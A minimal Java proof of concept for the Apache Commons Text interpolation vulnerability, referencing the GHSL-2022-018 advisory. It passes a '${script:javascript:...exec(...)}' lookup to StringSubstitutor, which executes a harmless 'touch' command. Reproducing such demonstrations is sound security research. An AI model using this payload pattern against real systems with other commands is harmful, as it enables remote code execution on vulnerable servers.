import org.apache.commons.text.StringSubstitutor;

public class Main {

    /**
     * @see https://securitylab.github.com/advisories/GHSL-2022-018_Apache_Commons_Text/
     */
    public void print() {
        final StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
        String out = interpolator.replace("${script:javascript:java.lang.Runtime.getRuntime().exec('touch ./foo')}");
        System.out.println(out);
    }

    public static void main(String... args) {
        new Main().print();
    }
}
